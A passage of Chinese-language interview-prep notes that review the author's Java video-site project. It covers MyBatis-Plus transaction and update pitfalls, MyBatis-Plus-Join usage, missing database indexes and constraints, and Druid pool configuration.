       new LambdaUpdateWrapper<ChatSession>()
           .eq(ChatSession::getSenderId, senderId)
           .set(ChatSession::getUpdateTime, now())
           .set(ChatSession::getUpdateContent, content);
       ```
    2. **加乐观锁**：实体加 `@Version` 字段 + 注册 `OptimisticLockerInnerInterceptor`：
       ```java
       @Version private Integer version;
       ```
       更新时框架自动加 `SET version = version+1 WHERE id=? AND version=?`，**受影响行数为 0 说明被别人改过**。
    3. **`@TableField(updateStrategy = FieldStrategy.NOT_NULL)`** 或全局设 `NOT_NULL` 策略，控制哪些字段参与更新。
  - **⚠️ 项目现状**：**没有任何一处用 `@Version` 乐观锁，也没注册 `OptimisticLockerInnerInterceptor`**（我 grep 过全项目）。而项目里有不少「读-改-写」模式（比如 `UploadAndEditServiceImpl.edit` 里 `videoMapper.updateById(video)`，其中 `video` 是从请求构造的 DTO，字段不全但也有值）。**这是需要补的第一优先级。**
  - **加分句**：**「`updateById` 本身没问题，问题在于『实体是不是全量字段的载体』。如果实体被复用于『查询结果』和『更新入参』两个角色，就必然出现意外覆盖。所以更好的实践是明确区分 Entity 和 UpdateDTO，UpdateDTO 里只有要改的字段。」**

**Q5 [深挖] 你项目里的 `@Transactional` 真的生效吗？**

- **考点**：**这是最能体现「真懂 Spring 事务」的一题，而且我项目里确实有 bug。**

- **答**：
  - **先说结论：有一处是失效的。** 看这段代码：
    ```java
    // UploadAndEditServiceImpl.java
    @Override
    @Transactional                                    // ← 声明了事务
    public Result<Boolean> uploadTotal(UploadVideoRequest req) {
        try {
            videoMapper.insert(video);
            videoDataMapper.insert(new VideoData().setVideoId(video.getId()));
            client.sendUploadNotice(...);             // 远程调用
            // ...
            return Result.success(true);
        } catch (Exception e) {
            e.printStackTrace();
            return Result.error("寄");                 // ← ★ 吞掉异常，返回正常对象
        }
    }
    ```
  - **为什么失效**：Spring 的声明式事务基于 **AOP 代理**，回滚的触发条件是**方法抛出异常**（默认只对 `RuntimeException` 和 `Error` 回滚，`Exception` 需要 `rollbackFor` 指定）。我这里 **catch 了所有异常并且 `return` 了一个正常的 `Result` 对象**——对 Spring 来说，**这个方法「正常返回」了，所以提交事务**。
  - **后果**：如果 `videoMapper.insert` 成功、`videoDataMapper.insert` 失败（比如 `video_id` 外键冲突），异常被吞掉 → **事务提交 → 数据库里留下一条没有 VideoData 的 Video 记录**（孤儿数据），而且接口返回 `code=600` 的"寄"，用户看到失败但数据已经脏了。
  - **正确做法**：
    ```java
    @Transactional(rollbackFor = Exception.class)     // ① 显式指定回滚异常
    public Result<Boolean> uploadTotal(...) {
        videoMapper.insert(video);
        videoDataMapper.insert(...);                  // 失败就让它抛出去 → 自动回滚
        // ② 远程调用/发消息不要放在事务里（见下）
        return Result.success(true);
    }
    ```
  - **顺带讲清三个相关知识点（这才是完整答案）**：
    1. **`@Transactional` 失效的 6 种场景**（面试高频）：① 方法不是 `public`；② **自己调用自己（`this.xxx()` 不走代理）**；③ 异常被 catch 吞掉；④ 抛出的是受检异常且没配 `rollbackFor`；⑤ 类没被 Spring 管理；⑥ 传播行为配错（`NOT_SUPPORTED` 等）。
    2. **事务里不要做远程调用**：我 `uploadTotal` 里在事务内调了 `client.sendUploadNotice()`（Feign → notice → RocketMQ）。**事务持有数据库连接的同时等待网络 I/O**，连接被长时间占用（我项目里 Druid 的连接池没有配置，默认 maxActive=8！），高并发下**连接池会瞬间耗尽**。正确做法是**「事务内只做数据库操作，事务提交后再发消息」**——用 `TransactionSynchronizationManager.registerSynchronization()` 的 `afterCommit`，或者干脆拆成两个方法。
    3. **`@Transactional` 的传播行为**（必答）：`REQUIRED`（默认，有事务就加入，没有就新建）、`REQUIRES_NEW`（挂起当前事务，开新事务，**用于「日志记录不受主事务回滚影响」**）、`NESTED`（嵌套事务，用 savepoint 实现）、`SUPPORTS`、`NOT_SUPPORTED`、`MANDATORY`、`NEVER`。

**Q6 [进阶] 你项目里的逻辑删除、字段填充是怎么做的？**

- **答**：
  - **逻辑删除**：**没做**。全项目没有 `@TableLogic` 注解，所有 `delete` 都是**物理删除**（`deleteById`、`delete(wrapper)` 都是 `DELETE FROM`）。
    - **风险**：① 数据不可恢复（用户误删视频就没了）；② **会破坏统计和审计**；③ `chat` 的私聊记录、`like` 记录被物理删除后，**ES 里的历史和通知就失去来源**。
    - **正确做法**：
      ```java
      @TableLogic                                          // 实体上加
      @TableField("deleted")
      private Integer deleted;                             // 0 未删 / 1 已删
      // 全局配置
      mybatis-plus.global-config.db-config.logic-delete-field: deleted
      mybatis-plus.global-config.db-config.logic-delete-value: 1
      mybatis-plus.global-config.db-config.logic-not-delete-value: 0
      ```
      配上之后，MP 会自动把 `delete` 改写成 `UPDATE ... SET deleted=1`，所有 `select` 自动加 `WHERE deleted=0`。**注意**：加了逻辑删除后**必须给查询字段加索引**（否则全表扫），而且**唯一索引要考虑 `deleted` 字段**（否则删除后无法重新插入同名记录）。
  - **字段填充**：**做了，而且是项目里 MyBatis-Plus 用得最好的地方**（见 11.1）。但有两个问题：
    1. **🟠 一个处理器塞了 12 个字段**：`MyMetaObjectHandler` 不分实体，**对所有实体都尝试填 `nickname`、`danmakuCount`、`playCount`……** 靠 `metaObject.hasSetter()` 判断字段是否存在。这导致**语义污染**——`Video` 实体也有 `cover` 字段，所以投稿时 `insertFill` 会把 `cover` 覆盖成**默认头像 URL**！项目文档里记录的 `FIX-14` 就是这个 bug：
       > 「原实现无条件 `setFieldValByName("cover", ...)`，而 Video 实体也有 cover 字段……把投稿时刚刚 setCover 上去的视频封面**覆盖成默认头像 URL**」
       修法是加 `null` 判断（现在的代码就是补丁版）。**根因是「一个 Handler 管所有实体」这个设计**，正确做法是**按实体类型分支**或**拆多个 Handler**。
    2. **🟡 默认值逻辑写死在 Handler 里**：`"新用户" + UUID` 这种业务规则混在框架回调里，还有 `@Value` 注入配置——**基础设施层混入业务逻辑**，测试和替换都困难。

**Q7 [进阶] MyBatis 的 `#{}` 和 `${}` 有什么区别？项目里用了吗？**

- **答**：
  | | `#{}` | `${}` |
  |---|---|---|
  | 实现 | **PreparedStatement 占位符 `?`** | **字符串直接拼接** |
  | 防注入 | ✅ **安全** | ❌ **有 SQL 注入风险** |
  | 适用 | 参数值 | 表名、列名、`ORDER BY` 字段等**不能作为参数的位置** |
  - **项目实证**：我项目里**全部用 `#{}`**（`VideoServiceMapper` 的 5 个 `@Select` 都是 `#{videoId}`、`#{count}`、`#{userId}`），**没有一处用 `${}`**——这一点做得对，没有 SQL 注入风险。
  - **但有一个隐患**：`constant/Constant.java` 里定义了 `public static final String SQL = "limit";` —— **定义了但全项目没用到**。如果当时真的用 `${SQL}` 之类的方式拼 SQL，就会引入注入风险。**这种「定义了但没用的 SQL 片段常量」是应该删掉的坏味道。**
  - **必须用 `${}` 的场景**（面试常问）：动态表名（分表）、动态排序字段：
    ```java
    // 排序字段必须用 ${}，但要白名单校验！否则注入
    @Select("SELECT * FROM video ORDER BY ${orderBy} DESC")
    List<Video> list(@Param("orderBy") String orderBy);
    // 调用前必须校验
    if (!Set.of("play_count","create_time","like_count").contains(orderBy)) throw new IllegalArgumentException();
    ```
    **我项目里排序字段是安全的**——ES 那侧用的是常量（`ORDER_BY_PLAY_COUNT` 等），MySQL 那侧写死在 SQL 里。

**Q8 [深挖] 你项目里那些计数字段（play_count / like_count / danmaku_count）是怎么更新的？**

- **考点**：**这题极其能区分「读没读过自己项目的 SQL」**，因为答案很反直觉。

- **答**：
  - **答法要分两步**（先说事实，再说取舍）：
  - **① 事实：Java 代码里完全不更新这些计数**。我 grep 过全项目，**`setLikeCount`、`setPlayCount`、`setDanmakuCount` 这些方法从来没有被调用过**（只在 `MyMetaObjectHandler` 里设过初始值 0）。`LikeServiceImpl.like()` 只做了两件事：
    ```java
    likeMapper.insert(likeRequest.toEntity());          // 写 likes 表
    client.sendLikeNotice(...setType(0));               // 发通知
    // ← 没有 setLikeCount + 1，也没有 update video_data
    ```
  - **② 真正在更新它的是 MySQL 触发器**（这才是我当时的设计）：
    ```sql
    -- docker/mysql/init/02-triggers.sql
    CREATE TRIGGER `increment_like_count` AFTER INSERT ON `likes` FOR EACH ROW BEGIN
        UPDATE video_data SET like_count = like_count + 1 WHERE video_id = NEW.video_id;
    END$$
    CREATE TRIGGER `de_like_count` AFTER DELETE ON `likes` FOR EACH ROW BEGIN
        UPDATE video_data SET like_count = GREATEST(like_count - 1, 0) WHERE video_id = OLD.video_id;
    END$$
    ```
    一共 7 个触发器，覆盖 `play` / `comment` / `likes` / `collect` / `danmaku` 表的 INSERT 和 DELETE。
  - **③ 为什么这么设计**（说清取舍）：
    - **优点**：① **原子性天然保证**——`INSERT INTO likes` 和 `UPDATE video_data` 在**同一个数据库事务**里，不会出现「点赞记录写了但计数没加」；② **应用层零代码**，任何途径（Java、SQL 脚本、运维手动）写 `likes` 表都会自动维护计数；③ 减少一次应用层的读-改-写。
    - **缺点**：① **性能**：触发器在数据库端执行，**增加了写锁持有时间和写放大**（一次点赞变成两次写），高并发点赞场景会成为热点行（`video_data` 里同一行被反复更新，**行锁竞争**）；② **对应用不可见**——**排查问题时看 Java 代码永远找不到计数为什么变了**（我这次就是被面试官问才发现）；③ 触发器逻辑无法单元测试，迁移数据库（MySQL → PG）要重写；④ `GREATEST(...,0)` 这种防御说明作者也不确定会不会减到负数。
    - **更好的方案**（这是加分回答）：
      1. **Redis 计数 + 定时落库**（B 站的实际做法）：`INCR video:like:{videoId}`，前端读 Redis，每 N 分钟或每 M 次批量刷回 DB。**把热点行写的压力转移到 Redis**，代价是可能丢少量计数（可接受）。
      2. **应用层用 `UPDATE ... SET like_count = like_count + 1`**（**原子自增，不用读-改-写**），放在和 `insert` 同一个 `@Transactional` 里。
      3. **计数与内容分离**：点赞明细表和不适合实时精确的计数分开，计数允许最终一致（通过 MQ 异步更新）。
  - **④ 这套方案在我项目里的实际后果**：因为计数靠触发器，而 **ES 的增量同步依赖应用层发的 `mysqlToEs` 消息**，所以「点赞」发起时 `video_data.like_count` 变了，但**应用层没有针对 `video_data` 发同步消息**（只发了 `like` 通知消息）。结果：**ES 里的 `like_count` 只在 xxl-job 全量同步时更新一次，之后永不刷新**——搜出来的播放量/点赞量是过期的。**这是触发器方案和异步同步方案叠加产生的隐蔽不一致，是一个很值得讲的点。**

### 11.3 主动暴露的坑

| 问题 | 位置 | 严重度 | 正确做法 |
|---|---|---|---|
| **`@Transactional` 被 catch 吞异常 → 事务不回滚** | `UploadAndEditServiceImpl:93,154` | 🔴 致命 | `rollbackFor` + 不吞异常 |
| **事务内做远程调用（Feign + MQ）** | `UploadAndEditServiceImpl:119,130` | 🟠 高 | 事务提交后发消息（`afterCommit`） |
| **无乐观锁 `@Version`** | 全项目 20 个实体 | 🟠 高 | 加 `@Version` + 注册拦截器 |
| **无 `PaginationInnerInterceptor`，分页手写 limit** | 无 Config 类 | 🟠 高 | 注册插件 + `Page` |
| 深分页 `LIMIT offset, size` 越翻越慢 | `VideoServiceMapper:23` | 🟡 中 | 游标分页（`id <`） |
| 魔法数字 12 硬编码在 SQL | `VideoServiceMapper:23` | 🟡 中 | 参数化 |
| **无逻辑删除，全是物理删除** | 全项目无 `@TableLogic` | 🟠 高 | 加 `deleted` + 索引 |
| `MetaObjectHandler` 一锅烩导致字段污染 | `MyMetaObjectHandler:42-45` | 🟠 高 | 按实体分支 |
| Druid 连接池未配置（默认 maxActive=8），事务内等 I/O 会耗尽 | 各 yml 仅 `type` 一行 | 🟠 高 | 见第 13 章 |
| 计数靠触发器，应用层不可见且与 ES 同步脱节 | `02-triggers.sql` | 🟡 中 | Redis 计数 + 落库 / 应用层原子自增 |
| `Constant.SQL` 定义未使用 | `video/constant/Constant.java:13` | 🟢 低 | 删除 |

---

## 第 12 章 MyBatis-Plus-Join —— 业务层多表查询

### 12.1 在这个项目里它扮演什么角色

**一句话**：MPJ 是 MyBatis-Plus 的「多表补丁」——**在不写 XML、不手写 SQL 的前提下做 `LEFT JOIN` 多表查询**。

**引入方式**：`java/pom.xml:333-337`
```xml
<dependency>
    <groupId>com.github.yulichang</groupId>
    <artifactId>mybatis-plus-join-boot-starter</artifactId>
    <version>1.4.10</version>
</dependency>
```

**使用方式**：Mapper 要额外继承 `MPJBaseMapper`，然后用 `MPJLambdaWrapper`：

```java
// PlayServiceImpl.getDetailVideo （:92-104）
MPJLambdaWrapper<Video> wrapper = new MPJLambdaWrapper<>();
wrapper.select(Video::getName, Video::getIntro, Video::getCreateTime, Video::getId, Video::getUrl);
wrapper.select(VideoData::getDanmakuCount, VideoData::getPlayCount,
               VideoData::getLikeCount, VideoData::getCollectCount);
wrapper.leftJoin(VideoData.class, VideoData::getVideoId, Video::getId);   // ★ 多表 join
wrapper.eq(Video::getId, videoId);
DetailVideoResponse response = videoMapper.selectJoinOne(DetailVideoResponse.class, wrapper);
```

```java
// MysqlToEsServiceImpl.videoMysqlToEs （:76-85）—— 三表 join + 字段别名映射
MPJLambdaWrapper<Video> wrapper = new MPJLambdaWrapper<>();
wrapper.leftJoin(User.class, User::getId, Video::getUserId);
wrapper.leftJoin(VideoData.class, VideoData::getVideoId, Video::getId);
wrapper.selectAs(Video::getName, VideoKeywordSearchResponse::getVideoName);
wrapper.selectAs(User::getNickname, VideoKeywordSearchResponse::getAuthorName);
List<VideoKeywordSearchResponse> list = videoMapper.selectJoinList(VideoKeywordSearchResponse.class, wrapper);
```

**项目里 MPJ 的实际使用点（数量不多，要能说清）**
| 位置 | 用途 |
|---|---|
| `PlayServiceImpl:92-104` | 视频详情页（video + video_data join） |
| `MysqlToEsServiceImpl:54-85` | ES 全量同步（video + user + video_data 三表 join） |
| `GetNoticeServiceImpl:45-75` | 未读数统计（video + like_notice、comment + like_notice、video + comment_notice 多次 join count） |

**其余多表查询用的是手写 SQL**：`VideoServiceMapper` 的 5 个 `@Select` 是手写 join，`NoticeServiceMapper`、`ChatServiceMapper`、`UserCenterServiceMapper` 也都有手写 SQL。**这是一个"两套方案并存"的现状，面试时要能解释。**

### 12.2 高频问答

**Q1 [必答] 为什么需要 MyBatis-Plus-Join？**

- **答**：
  - **痛点**：MyBatis-Plus 的强项是**单表**，但**多表 join 它不支持**。原生的解法有三条：① 手写 XML/注解 SQL（**SQL 和 Java 分离，字段名靠字符串，重构易漏**）；② 多次单表查询在 Java 里拼装（**N+1 问题，网络往返多**）；③ 建冗余宽表（**写放大，一致性成本高**）。
  - **MPJ 的价值**：它**把 MPJ 的 Lambda 风格扩展到多表**——`leftJoin(Class, 主键, 外键)` + `selectAs(源字段, 目标字段)`，**全程用方法引用，编译期校验**，最后 `selectJoinOne/List/Count` 直接映射成 VO。等于「**不写 SQL 就能 join，且字段名重构安全**」。
  - **项目里的实际收益**：
    ```java
    // 换成手写 SQL 要这样（VideoServiceMapper 里的风格）
    @Select("SELECT v.name, v.intro, vd.play_count, vd.like_count FROM video v " +
            "LEFT JOIN video_data vd ON vd.video_id = v.id WHERE v.id = #{videoId}")
    DetailVideoResponse getDetail(@Param("videoId") Integer videoId);
    ```
    对比 `selectAs` 的写法，MPJ 版本**改字段名不会漏、字段映射关系显式可见**。
  - **代价**（必须讲）：
    1. **SQL 不透明**：MPJ 生成的 SQL 你看不到（只能开 `mybatis-plus.configuration.log-impl` 打日志），**复杂 join 一旦有问题排查困难**；
    2. **复杂场景表达力不如手写 SQL**：子查询、`UNION`、窗口函数、`HAVING`、CTE 这些 MPJ 支持有限或很别扭；
    3. **额外依赖和版本耦合**：MPJ 1.4.10 必须和 MyBatis-Plus 3.5.2 版本匹配，**升级任一方都可能不兼容**（这是个真实的维护负担）；
    4. **性能调优不直观**：想看执行计划、想改索引，得先知道生成了什么 SQL。

**Q2 [必答] 项目里为什么既有 MPJ 又有手写 SQL？该怎么统一？**

- **答**（**这题考的是「工程判断力」，非常能加分**）：
  - **为什么并存**（诚实）：`VideoServiceMapper` 里那 5 个手写 `@Select` 是**早期写的**（那时还没引 MPJ）；`PlayServiceImpl.getDetailVideo` 是**后来用 MPJ 写的**。属于「**技术演进过程中的两套方案并存**」，没有统一过。
  - **该怎么选**（给出明确标准，比含糊说「看情况」强得多）：
    | 场景 | 选 MPJ | 选手写 SQL |
    |---|---|---|
    | 2-3 表 `LEFT JOIN` + 简单 `WHERE` | ✅ | |
    | 需要 `selectAs` 到 VO/DTO | ✅ | |
    | 单表/多表 `count` 统计 | ✅ | |
    | **需要子查询 / `UNION` / `HAVING`** | ❌ | ✅ |
    | **需要窗口函数 / CTE / 复杂聚合** | ❌ | ✅ |
    | **SQL 需要 DBA 审核 / 上执行计划** | ❌ | ✅ |
    | 需要 `FORCE INDEX` 等 hint | ❌ | ✅ |
    | **需要按条件动态拼大段 SQL** | | ✅（XML 的 `<if>` 更强） |
  - **我项目的具体整改方案**：
    1. **`PlayServiceImpl.getDetailVideo`** → 保留 MPJ（2 表 join + selectAs，正合适）；
    2. **`MysqlToEsServiceImpl`** → 保留 MPJ（3 表 join + 大量 selectAs）；
    3. **`GetNoticeServiceImpl.getNoticeCount`** → **这是最该改的一个**（见 Q3）；
    4. **`VideoServiceMapper` 的 5 个手写 SQL** → 其中 `getFirstPageVideo`（video + user + video_data 三表 join）适合改 MPJ；`getCommentToVideo`（**四表 join + 两次 self join**）保留手写。
  - **加分句**：**「统一技术栈的目标不是『全都用 MPJ』，而是『每处都有一致的选型判据』。我的判据是『能用 MPJ 表达清楚且不需要 DBA 审核的，用 MPJ；超出表达力或需要精细性能控制的，用手写 SQL，并且集中放在 `XxxServiceMapper` 里』。」**

**Q3 [深挖] `GetNoticeServiceImpl.getNoticeCount` 这个方法有什么问题？**

- **考点**：**这是本章最有价值的一题，能同时考出「MPJ 理解」「SQL 性能」「代码质量」三层。**

- **答**（逐条拆解这段 30 行代码）：
  ```java
  public Result<UnReadNoticeCountResponse> getNoticeCount(Integer userId) {
      // 一次请求里创建了 6 个 wrapper
      LambdaQueryWrapper<Chat> chatLambdaQueryWrapper = new LambdaQueryWrapper<>();
      MPJLambdaWrapper<Video> videoLikeLambdaQueryWrapper = new MPJLambdaWrapper<>();
      MPJLambdaWrapper<Comment> commentLikeLambdaQueryWrapper = new MPJLambdaWrapper<>();
      MPJLambdaWrapper<Video> videoLambdaQueryWrapper = new MPJLambdaWrapper<>();
      MPJLambdaWrapper<Comment> commentLamdaQueryWrapper = new MPJLambdaWrapper<>();
      LambdaQueryWrapper<DynamicToUser> dynamicToUserLambdaQueryWrapper = new LambdaQueryWrapper<>();
      // ... 然后发 6 次 SQL
      long videoLikeCount = videoMapper.selectJoinCount(videoLikeLambdaQueryWrapper);
      long commentLikeCount = commentMapper.selectJoinCount(commentLikeLambdaQueryWrapper);
      long chatCount = chatMapper.selectCount(chatLambdaQueryWrapper);
      long dynamicVideoCount = dynamicToUserMapper.selectCount(dynamicToUserLambdaQueryWrapper);
      long videoCommentCount = videoMapper.selectJoinCount(videoLambdaQueryWrapper);
      long commentCommentCount = commentMapper.selectJoinCount(commentLamdaQueryWrapper);
  ```
  1. **🔴 一次请求发 6 次 SQL，全是 `COUNT`**：每个 `COUNT` 都要扫描/统计，**6 次串行往返**。通知红点是**每个页面都会请求的接口**（首页、视频页、消息页都要显示未读数），高频 + 6 次查询 = **数据库明显热点**。
  2. **🔴 无缓存**：明明是很典型的「读多写少」数据，**却每次现算**。项目里 Redis 是现成的，却没用上（我 grep 过：`notice` 模块的 Redis 只用于 ES 同步队列，**未读数和 Redis 完全无关**）。
     - **正确做法**：Redis Hash 存未读数 `notify:unread:{userId}` → `{chat: 2, like: 5, comment: 1}`，**读时直接 HGETALL**（1 次 Redis 往返，微秒级）；写时（消费者落库通知）`HINCRBY` 自增；**用户点开消息列表时 `HSET` 清零**。这是「**写时累加 + 读时直取**」的经典设计，把计算成本从「每次读」搬到「每次写」，而**写的频率天然低于读**。
  3. **🟠 `totalCount` 少算了一项**：
     ```java
     long totalCount = chatCount + likeCount + commentCount;   // ← 没有加 dynamicVideoCount！
     return ...setDynamicVideoCount(dynamicVideoCount).setTotalCount(totalCount);
     ```
     **返回体里有 4 个分量，但 `totalCount` 只加了 3 个** —— **动态数没算进总数**。前端如果用 `totalCount` 显示总红点，会**比实际少**。这是明确的计算 bug。
  4. **🟠 死代码**：
     ```java
     commentLikeLambdaQueryWrapper.eq(Like::getUserId, userId);   // :61
     ```
     这一行是加在 `commentLikeLambdaQueryWrapper` 上的，但它**已经在上面的 `selectJoinCount` 里用过了**（:60），而且这一句之后这个 wrapper **再也没被使用**（后面用的是 `commentLamdaQueryWrapper`，注意拼写不同：`Lamda` vs `Lambda`）。**这是复制粘贴留下的死代码**，而且 `Like` 这个实体在这个 wrapper 里根本没被 join 进来，写上去也不会有任何效果。
     - **顺带一个坏味道**：两个变量名 `commentLikeLambdaQueryWrapper` 和 `commentLamdaQueryWrapper` 只差**一个字母拼写**（`Lambda` vs `Lamda`），**在 30 行代码里人眼几乎无法区分**。这是极易引入 bug 的命名。
  5. **🟠 `MPJLambdaWrapper` 的新建成本 + join 顺序**：`videoLikeLambdaQueryWrapper.eq(Video::getUserId, userId).leftJoin(LikeNotice.class, LikeNotice::getVideoId, Video::getId)` —— **先 `eq` 再 `leftJoin`**，逻辑上没问题（MPJ 的链式调用顺序不影响 SQL 生成顺序），但**语义上应该先 join 再过滤**，可读性更好。
  6. **🟡 缺少索引支持**：这些 `COUNT` 查询依赖 `like_notice.status`、`comment_notice.status`、`dynamic_to_user.status`、`chat_notice.receiver_id + status` 上的索引。我核对过 schema：**`like_notice`/`comment_notice`/`dynamic`/`dynamic_to_user` 四张表只有主键，没有任何二级索引**。所以这 6 条 SQL 全部是 **`type=ALL` 全表扫描**。数据量一大，这个接口会直接拖垮数据库。
     - **正确做法**：`ALTER TABLE like_notice ADD INDEX idx_status_video (status, video_id);` 等，按查询条件建联合索引（**最左前缀**：`status` 和 `user_id`/`video_id` 哪个选择性高放前面）。
  - **重构后的样子**（讲这个能体现水平）：
    ```java
    public Result<UnReadNoticeCountResponse> getNoticeCount(Integer userId) {
        // 1. 优先读 Redis Hash（1 次往返）
        Map<Object,Object> cached = redis.opsForHash().entries("notify:unread:" + userId);
        if (!cached.isEmpty()) return Result.data(UnReadNoticeCountResponse.from(cached));
        // 2. 缓存未命中才回源，且一条 SQL 用 UNION ALL 聚合 4 个计数
        List<IdCount> counts = noticeServiceMapper.getUnreadCounts(userId);  // 手写 UNION ALL
        // 3. 写回缓存（无 TTL 或用较长 TTL，靠写时更新保证准确）
        ...
    }
    ```

### 12.3 主动暴露的坑

| 问题 | 位置 | 严重度 | 正确做法 |
|---|---|---|---|
| **未读数一次请求 6 次 SQL，无缓存** | `GetNoticeServiceImpl:43-79` | 🔴 致命 | Redis Hash「写时累加、读时直取」 |
| **`totalCount` 漏算动态数** | `GetNoticeServiceImpl:77` | 🟠 高 | 加上 `dynamicVideoCount` |
| **通知类 4 张表无二级索引 → 全表扫** | `01-schema.sql:147-173` | 🔴 致命 | 按查询条件建联合索引 |
| 死代码 + 拼写极易混淆的变量名 | `GetNoticeServiceImpl:61`、`commentLamdaQueryWrapper` | 🟡 中 | 删除死代码 + 重命名 |
| MPJ 与手写 SQL 两套方案并存无标准 | `VideoServiceMapper` vs `PlayServiceImpl` | 🟡 中 | 统一选型判据（见 Q2） |
| MPJ 生成的 SQL 不可见 | 全项目 | 🟡 中 | 开 SQL 日志 + 慢查询监控 |

### 12.4 ⚠️ 专题：这个项目的数据库设计有一个全局性缺陷，必须主动讲

**我核对了建表脚本 `docker/mysql/init/01-schema.sql`，结论是：**

| 检查项 | 结果 |
|---|---|
| 建表数量 | 22 张（21 张业务表 + zipkin 相关表） |
| **二级索引（普通索引）** | **0 个**（业务表） |
| **唯一索引 / 唯一约束** | **0 个**（业务表） |
| **外键约束（FOREIGN KEY）** | **0 个** |
| 每张表有的 | 只有 `PRIMARY KEY (id)` |
| 唯一有索引的地方 | **zipkin 自带的建表脚本**（`zipkin_spans`/`zipkin_annotations` 上有 INDEX），说明**索引不是"不会写"，而是业务表没设计** |

**这意味着什么（面试时要能把后果讲具体）**

1. **🔴 所有非主键条件的查询都是全表扫描**。项目里遍地是这样的查询：
   ```java
   wrapper.eq(Video::getUserId, userId);        // video.user_id 无索引 → 全表扫
   wrapper.eq(Chat::getReceiverId, userId);     // 无索引 → 全表扫
   wrapper.eq(LikeNotice::getStatus, 0);        // 无索引 → 全表扫
   wrapper.eq(Follow::getFansId, userId);       // 无索引 → 全表扫
   ```
   而 `GetNoticeServiceImpl.getNoticeCount` **一次请求要跑 6 条这样的 SQL**。数据量到万级时，这个接口就会成为数据库杀手。
2. **🔴 触发器让写操作也变成全表扫描**（**这是最隐蔽的一环**）：
   ```sql
   CREATE TRIGGER `increment_like_count` AFTER INSERT ON `likes` FOR EACH ROW BEGIN
       UPDATE video_data SET like_count = like_count + 1 WHERE video_id = NEW.video_id;   -- 无索引！
   END$$
   ```
   **每点一次赞，就要全表扫一遍 `video_data`**（且持有行锁）。点赞是高频写操作，这里的代价会随视频数量线性恶化。
3. **🔴 无唯一约束 → 数据库没法兜底幂等**。RocketMQ 是 at-least-once 语义，重复消费时 `like_notice.insert` 会插入重复通知——**没有任何数据库约束能拦住它**（见第 9 章 Q5）。
4. **🔴 无外键 → 数据可以随便「孤儿化」**。删除视频时 `UploadAndEditServiceImpl.delete` 只删了 `video` 和 `video_data`，**没有删对应的 `like`/`comment`/`danmaku`/`collect`/`play`/`dynamic` 记录**。因为没有外键约束（无论级联还是限制），数据库**不会报错也不会级联**，这些记录就永久留在表里成为孤儿数据，还会被统计到用户的"点赞列表"里，点进去 404。
5. **🟡 无唯一约束 → 「重复点赞」在数据库层没有任何防护**。「一个用户对一个视频只能赞一次」这条业务规则**只能靠应用层代码保证**，而我核对过 `LikeServiceImpl.like()`：**它没有任何「是否已点赞」的检查，直接 `insert`**！所以同一个用户连续点赞两次会在 `likes` 表里产生两条记录，`like_count` 被触发器加了 2。**这是当前实现里一个确定性的业务 bug。**

**完整的整改清单（背下来，这是很实在的加分项）**

```sql
-- ① 高频查询条件建二级索引（按最左前缀原则，选择性高的列放前面）
ALTER TABLE video        ADD INDEX idx_user_id (user_id);
ALTER TABLE video_data   ADD INDEX idx_video_id (video_id);          -- ★ 触发器依赖
ALTER TABLE likes        ADD INDEX idx_user_video (user_id, video_id);
ALTER TABLE comment      ADD INDEX idx_video_id (video_id);
ALTER TABLE danmaku      ADD INDEX idx_video_id (video_id);
ALTER TABLE play         ADD INDEX idx_user_time (user_id, create_time);
ALTER TABLE collect      ADD INDEX idx_group_video (collect_group_id, video_id);
ALTER TABLE follow       ADD INDEX idx_fans (fans_id), ADD INDEX idx_idol (idol_id);
ALTER TABLE chat_notice  ADD INDEX idx_receiver_status (receiver_id, status);   -- ★ 未读数查询
ALTER TABLE like_notice  ADD INDEX idx_status_video (status, video_id);
ALTER TABLE comment_notice ADD INDEX idx_status_video (status, video_id);
ALTER TABLE dynamic_to_user ADD INDEX idx_user_status (user_id, status);
ALTER TABLE chat_session ADD INDEX idx_sender_receiver (sender_id, receiver_id);

-- ② 唯一约束兜底业务规则 + MQ 幂等
ALTER TABLE likes        ADD UNIQUE KEY uk_user_video_comment (user_id, video_id, comment_id);
ALTER TABLE follow       ADD UNIQUE KEY uk_fans_idol (fans_id, idol_id);        -- 防重复关注
ALTER TABLE like_notice  ADD UNIQUE KEY uk_notice (sender_id, video_id, comment_id);
ALTER TABLE collect      ADD UNIQUE KEY uk_group_video (collect_group_id, video_id);  -- 防重复收藏
ALTER TABLE user         ADD UNIQUE KEY uk_username (username);
ALTER TABLE user         ADD UNIQUE KEY uk_phone (phone_number);

-- ③ 外键（微服务项目里可选：因为「视频」和「评论」可能属于不同服务，
--    加外键会阻碍分库分表。更常见的做法是「应用层保证 + 定时对账任务清理孤儿数据」）
```

**面试时怎么讲这一节**（这是全篇最能体现"工程素养"的地方之一）：

> 「我要主动说一个我自己复盘时发现的问题：**这个项目的 21 张业务表只有主键，没有任何二级索引、唯一索引和外键**。后果是三重的一一所有非主键查询全表扫；触发器 `UPDATE video_data WHERE video_id=?` 也全表扫，让**点赞这种高频写变成全表扫 + 行锁**；而且没有唯一约束，**数据库层没法兜底幂等**，RocketMQ 重复消费会写重复通知，甚至同一个用户可以对同一个视频**重复点赞**（`LikeServiceImpl` 里没有任何已点赞检查）。
>
> 这不是『忘了加索引』，是**表设计阶段就没有做过查询模式分析**。我的整改顺序是：**先给触发器依赖的 `video_data.video_id` 和高频查询条件加二级索引（收益最大、风险最低），再加唯一约束兜底业务规则和 MQ 幂等，最后评估外键**——微服务下外键可能阻碍分库分表，所以外键我会用『应用层保证 + 定时对账清理孤儿数据』替代。」

---

## 第 13 章 Druid —— 阿里数据库连接池

### 13.1 在这个项目里它扮演什么角色

**一句话**：Druid 是这个项目的**数据库连接池**，负责连接的创建、复用、回收和监控。

**引入方式**：`java/pom.xml:143-147`，版本 **1.2.12**；各模块 pom 也单独引了 `druid`（gateway / video / notice / search / user_center 都有）。

**实际配置**（**这就是全部了**）：
```yaml
spring:
  datasource:
    type: com.alibaba.druid.pool.DruidDataSource     # ← 只有这一行
    name: datasource
    url: jdbc:mysql://localhost:3306/bilibili?...
    username: root
    password: user
```

**⚠️ 关键事实**：`type` 后面**被注释掉的内容**说明作者原本想配 Hikari 的参数（`# hikari: max-lifetime / idle-timeout / validation-timeout`），说明当时在比较两个连接池。而**Druid 自己的池参数、监控、防火墙，一个都没配**。

### 13.2 高频问答

**Q1 [必答] 为什么用 Druid？连接池的作用是什么？**

- **答**（三段）：
